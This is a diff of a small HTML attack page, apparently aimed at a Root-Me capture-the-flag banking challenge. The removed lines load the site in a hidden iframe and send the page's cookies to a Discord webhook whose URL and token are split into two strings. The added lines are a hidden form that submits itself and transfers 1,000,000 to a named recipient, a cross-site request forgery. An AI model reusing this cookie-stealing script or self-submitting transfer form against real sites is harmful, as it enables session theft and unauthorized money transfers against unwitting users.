@@ -1,15 +1,8 @@
-<iframe style="display:none;" id="iframe" name="iframe" src="https://bankme-0.challenges.pro.root-me.org/"></iframe>
+<form action="https://bankme-1.challenges.pro.root-me.org/transfer" method="post">
+<input name="recipient" value="clem">
+<input name="amount" value="1000000">
+<button type="submit">Send</button>
+</form>
 <script>
-  document.getElementById('iframe').onload = function() {
-    fetch('https://discord.com/api/webhooks/1362229098960781342/ez' + '8jZMtgBIaBQwhx7MdSCvMX3b4upWWFMVW5K9EbjO1vgqeXgLuNye5SPSEo-wIGzoyL', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        content: `Cookies: ${document.cookie}`
-      }),
-    });
-  };
-
+document.forms[0].submit();
 </script>
